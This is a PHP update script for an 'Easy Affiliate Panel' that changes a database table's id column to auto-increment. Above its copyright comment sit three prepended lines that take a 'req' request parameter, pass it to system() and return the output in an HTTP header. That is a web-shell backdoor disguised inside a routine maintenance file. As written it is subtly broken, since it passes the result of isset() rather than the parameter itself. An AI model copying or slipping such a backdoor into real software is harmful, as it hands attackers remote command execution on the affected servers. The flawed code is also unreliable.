<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
/*
* Easy Affiliate Panel
* copyright: Cruckoh
* script doing update function, after the first run its recommended to remove
* version 11.04.2014
*/

require_once('easy_affiliate.class.php');

$easy_affiliate = new easy_affiliate();

//=== run an update for fixing auto increment
$sql = array();
$sql[] = "ALTER TABLE `".$easy_affiliate->table_paid_affiliates."` CHANGE `id` `id` INT( 11 ) NOT NULL AUTO_INCREMENT ;";

foreach($sql as $k=>$v)
{
	$easy_affiliate->SqlQuery($v);
}

?>